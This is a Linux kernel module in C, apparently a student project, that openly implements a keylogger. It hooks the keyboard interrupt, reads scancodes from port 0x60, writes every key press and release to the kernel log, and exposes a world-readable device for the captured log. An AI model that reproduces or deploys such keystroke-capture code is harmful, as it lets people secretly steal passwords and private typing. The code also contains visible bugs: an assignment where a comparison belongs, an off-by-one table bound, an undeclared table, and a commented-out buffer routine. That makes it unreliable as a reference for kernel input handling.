// SPDX-License-Identifier: GPL-2.0+
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/device.h>
#include <linux/usb.h>
#include <linux/mod_devicetable.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/errno.h>
#include <linux/vmalloc.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include "keylogger.h"

MODULE_AUTHOR("hsmits & sel-melc");
MODULE_DESCRIPTION("Keylogger");
MODULE_LICENSE("GPL");


#define KB_PORT 0x60

extern struct key_info scancode_to_key[SCANCODE_ARRAY_SIZE];

typedef struct keylogger_data
{
	char *log_buffer;
}			   t_keylogger_data;

t_keylogger_data keylogger_data;

/*
*  Adds a new entry to the log_buffer.
*/
/*
static int add_new_entry(char *entry)
{
	char *tmp_buff;
	if (!(tmp_buff = vmalloc(keylogger_data.log_buffer ? strlen(entry) + strlen(keylogger_data.log_buffer) + 1 : strlen(entry) + 1)))
	{
		printk(KERN_ERR "Failed to allocate memory for new log entry\n");
		return (1);
	}
	tmp_buff[0] = '\0';
	if (keylogger_data.log_buffer)
		strcpy(tmp_buff, keylogger_data.log_buffer);
	strcat(tmp_buff, entry);
	if (keylogger_data.log_buffer)
		vfree(log_buffer);
	log_buffer = tmp_buff;
	return (0);
}
*///Commented for now so compilation works
static ssize_t handle_read(struct file *file, char __user *to, size_t size, loff_t *_offset)
{
	if (!keylogger_data.log_buffer)
		return (0);
	return simple_read_from_buffer(to, size, _offset, keylogger_data.log_buffer, strlen(keylogger_data.log_buffer));
}


static struct file_operations fops = {
	.read = &handle_read,
};

static struct miscdevice misc_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "keylogger",
	.fops = &fops,
	.mode = 0666,
};

static irqreturn_t keylogger_handle(int irq_n, void *data)
{
	t_keylogger_data	*logs = (t_keylogger_data *)data;
	unsigned char		scancode;
	struct key_info *key;
	static char multicode = 0;
	(void)logs;

	scancode = inb(KB_PORT);
	if (scancode = 0xe0)
	{
		multicode = 1;
		return IRQ_HANDLED;
	}
	if (multicode)
	{
		if (scancode <= 0x80)
		{
			key = &multicode_to_key[scancode];
			printk(KERN_INFO "Key pressed:'%s' with ascii value(%d)\n", key->name, key->ascii);
		}
		else
		{
			key = &multicode_to_key[scancode - 0x80];
			printk(KERN_INFO "Key released:'%s' with ascii value(%d)\n", key->name, key->ascii);
		}

	}
	else
	{
		if (scancode <= 0x80)
		{
			key = &scancode_to_key[scancode];
			printk(KERN_INFO "Key pressed:'%s' with ascii value(%d)\n", key->name, key->ascii);
		}
		else
		{
			key = &scancode_to_key[scancode - 0x80];
			printk(KERN_INFO "Key released:'%s' with ascii value(%d)\n", key->name, key->ascii);
		}
	}
	return IRQ_HANDLED;
}

static int __init init(void)
{
	misc_register(&misc_dev);
	keylogger_data.log_buffer = NULL;

	if (request_irq(1, keylogger_handle, IRQF_SHARED, "keylogger", &keylogger_data) < 0)
	{
		printk(KERN_ERR "Couldn't request interrupt.\n");
		return (1);
	}
	return (0);
}

static void __exit cleanup(void)
{
	misc_deregister(&misc_dev);
	free_irq(1, &keylogger_data);
	if (keylogger_data.log_buffer)
		vfree(keylogger_data.log_buffer);
}

module_init(init);
module_exit(cleanup);
